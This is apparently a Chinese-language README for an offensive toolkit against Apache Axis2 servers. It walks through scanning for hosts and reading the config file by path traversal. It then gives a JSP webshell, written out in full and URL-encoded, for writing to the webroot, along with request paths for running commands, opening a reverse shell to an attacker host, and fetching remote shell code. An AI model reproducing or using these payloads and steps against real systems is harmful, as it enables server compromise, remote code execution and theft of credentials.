#Apache axis2内部信息泄漏
/axis2/axis2-web/HappyAxis.jsp 
/axis2/services/Version?xsd=../conf/axis2.xml （有事密码不正确的时候可以看看这里有木有文件包含漏洞）

#1.Scan AXIS2 目录里
是扫描ip及端口的、利用s扫描器、这里S扫描器就自己找吧，免得说有后门！ips.txt就是扫描出来的结果

#2.Asix2.py （需要下载Requests模块 python 2.7环境） 
使用方法$python axis2.py url.txt   （把上面ips.txt 结果放入url.txt中）
存在AXIS2会写在Success.txt里

#3.shell目录
使用方法：
第一个是写入shell或是写入文件，写入shell在网站不能连接外网时候 上传小马 
1<%if(request.getParameter("f")!=null)(new java.io.FileOutputStream(application.getRealPath("/")+request.getParameter("f"))).write(request.getParameter("t").getBytes());%><a href="One_OK"></a>1 

进行url编码

/axis2/services/Cat/writeStringToFile?data=test %31%3c%25%69%66%28%72%65%71%75%65%73%74%2e%67%65%74%50%61%72%61%6d%65%74%65%72%28%22%66%22%29%21%3d%6e%75%6c%6c%29%28%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%46%69%6c%65%4f%75%74%70%75%74%53%74%72%65%61%6d%28%61%70%70%6c%69%63%61%74%69%6f%6e%2e%67%65%74%52%65%61%6c%50%61%74%68%28%22%2f%22%29%2b%72%65%71%75%65%73%74%2e%67%65%74%50%61%72%61%6d%65%74%65%72%28%22%66%22%29%29%29%2e%77%72%69%74%65%28%72%65%71%75%65%73%74%2e%67%65%74%50%61%72%61%6d%65%74%65%72%28%22%74%22%29%2e%67%65%74%42%79%74%65%73%28%29%29%3b%25%3e%3c%61%20%68%72%65%66%3d%22%4f%6e%65%5f%4f%4b%22%3e%3c%2f%61%3e%31 text&file=网站物理路径&encoding=utf-8&append=false

第二个是获取路径 (getClassPath)
/axis2/services/Cat/getClassPath

第三个是执行命令
/axis2/services/Cat/exec?cmd=whoami

第四个是反弹shell
/axis2/services/Cat/shell?host=*.*.*.*&port=12345

第五个远程写shell、config aar (Web.txt 为shell代码)

/axis2/services/config/download?url=http://url.com/web.txt&path=D:/plat_resin-pro-3.2.1/webapps/axis2/web.jsp

